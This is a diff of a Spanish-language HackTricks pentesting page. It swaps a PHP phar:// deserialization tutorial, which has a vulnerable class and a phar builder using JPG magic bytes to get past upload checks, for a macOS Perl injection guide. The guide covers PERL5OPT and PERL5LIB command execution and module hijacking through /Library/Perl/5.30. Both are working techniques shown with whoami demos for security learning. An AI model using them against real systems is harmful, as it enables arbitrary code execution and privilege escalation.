@@ -1,4 +1,4 @@
-# Deserialización de phar://
+# Inyección de Aplicaciones Perl en macOS
 
 <details>
 
@@ -6,90 +6,75 @@
 
 * ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
 * Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Obtén el [**swag oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
+* Obtén el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
 * **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
 * **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
 
-<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">
+## A través de las variables de entorno `PERL5OPT` y `PERL5LIB`
 
-Si estás interesado en una **carrera de hacking** y hackear lo imposible, ¡**estamos contratando**! (_se requiere dominio del polaco escrito y hablado_).
+Usando la variable de entorno PERL5OPT es posible hacer que perl ejecute comandos arbitrarios.\
+Por ejemplo, crea este script:
 
-{% embed url="https://www.stmcyber.com/careers" %}
-
-Los archivos **Phar** (PHP Archive) contienen metadatos en formato serializado, por lo que, al analizarlos, estos metadatos se deserializan y puedes intentar aprovechar una vulnerabilidad de **deserialización** dentro del código **PHP**.
-
-Lo mejor de esta característica es que esta deserialización ocurrirá incluso utilizando funciones de PHP que no evalúan código PHP, como **file\_get\_contents(), fopen(), file() o file\_exists(), md5\_file(), filemtime() o filesize()**.
-
-Entonces, imagina una situación en la que puedes hacer que un sitio web PHP obtenga el tamaño de un archivo arbitrario utilizando el protocolo **`phar://`**, y dentro del código encuentras una **clase** similar a la siguiente:
-
-{% code title="vunl.php" %}
-```php
-<?php
-class AnyClass {
-public $data = null;
-public function __construct($data) {
-$this->data = $data;
-}
-
-function __destruct() {
-system($this->data);
-}
-}
-
-filesize("phar://test.phar"); #The attacker can control this path
+{% code title="test.pl" %}
+```perl
+#!/usr/bin/perl
+print "Hello from the Perl script!\n";
 ```
 {% endcode %}
 
-Puedes crear un archivo **phar** que, cuando se cargue, **abusará de esta clase para ejecutar comandos arbitrarios** con algo como:
+Ahora **exporta la variable de entorno** y ejecuta el script **perl**:
+```bash
+export PERL5OPT='-Mwarnings;system("whoami")'
+perl test.pl # This will execute "whoami"
+```
+Otra opción es crear un módulo Perl (por ejemplo, `/tmp/pmod.pm`):
 
-{% code title="create_phar.php" %}
-```php
-<?php
-
-class AnyClass {
-public $data = null;
-public function __construct($data) {
-$this->data = $data;
-}
-
-function __destruct() {
-system($this->data);
-}
-}
-
-// create new Phar
-$phar = new Phar('test.phar');
-$phar->startBuffering();
-$phar->addFromString('test.txt', 'text');
-$phar->setStub("\xff\xd8\xff\n<?php __HALT_COMPILER(); ?>");
-
-// add object of any class as meta data
-$object = new AnyClass('whoami');
-$phar->setMetadata($object);
-$phar->stopBuffering();
+{% code title="/tmp/pmod.pm" %}
+```perl
+#!/usr/bin/perl
+package pmod;
+system('whoami');
+1; # Modules must return a true value
 ```
 {% endcode %}
 
-Observa cómo se agregan los **bytes mágicos de JPG** (`\xff\xd8\xff`) al principio del archivo phar para **evitar** **posibles** **restricciones** de **carga** de archivos.\
-**Compila** el archivo `test.phar` con:
+Y luego utiliza las variables de entorno:
 ```bash
-php --define phar.readonly=0 create_phar.php
+PERL5LIB=/tmp/ PERL5OPT=-Mpmod
 ```
-Y ejecuta el comando `whoami` abusando del código vulnerable con:
+## A través de dependencias
+
+Es posible listar el orden de las carpetas de dependencias de Perl en ejecución:
 ```bash
-php vuln.php
+perl -e 'print join("\n", @INC)'
 ```
-### Referencias
+Lo cual devolverá algo como:
+```bash
+/Library/Perl/5.30/darwin-thread-multi-2level
+/Library/Perl/5.30
+/Network/Library/Perl/5.30/darwin-thread-multi-2level
+/Network/Library/Perl/5.30
+/Library/Perl/Updates/5.30.3
+/System/Library/Perl/5.30/darwin-thread-multi-2level
+/System/Library/Perl/5.30
+/System/Library/Perl/Extras/5.30/darwin-thread-multi-2level
+/System/Library/Perl/Extras/5.30
+```
+Algunas de las carpetas devueltas ni siquiera existen, sin embargo, **`/Library/Perl/5.30`** sí **existe**, no está **protegida** por **SIP** y está **antes** de las carpetas **protegidas por SIP**. Por lo tanto, alguien podría abusar de esa carpeta para agregar dependencias de scripts y hacer que un script Perl de alto privilegio las cargue.
 
-{% embed url="https://blog.ripstech.com/2018/new-php-exploitation-technique/" %}
+{% hint style="warning" %}
+Sin embargo, ten en cuenta que **necesitas ser root para escribir en esa carpeta** y hoy en día obtendrás esta **solicitud de TCC**:
+{% endhint %}
 
-<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">
+<figure><img src="../../../.gitbook/assets/image (1).png" alt="" width="244"><figcaption></figcaption></figure>
 
-Si estás interesado en una **carrera de hacking** y hackear lo inhackeable - **¡estamos contratando!** (_se requiere fluidez en polaco escrito y hablado_).
+Por ejemplo, si un script está importando **`use File::Basename;`**, sería posible crear `/Library/Perl/5.30/File/Basename.pm` para ejecutar código arbitrario.
 
-{% embed url="https://www.stmcyber.com/careers" %}
+## Referencias
+
+* [https://www.youtube.com/watch?v=zxZesAN-TEk](https://www.youtube.com/watch?v=zxZesAN-TEk)
 
 <details>
 
@@ -97,7 +82,7 @@ Si estás interesado en una **carrera de hacking** y hackear lo inhackeable - **
 
 * ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
 * Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Obtén el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
+* Obtén el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
 * **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
 * **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
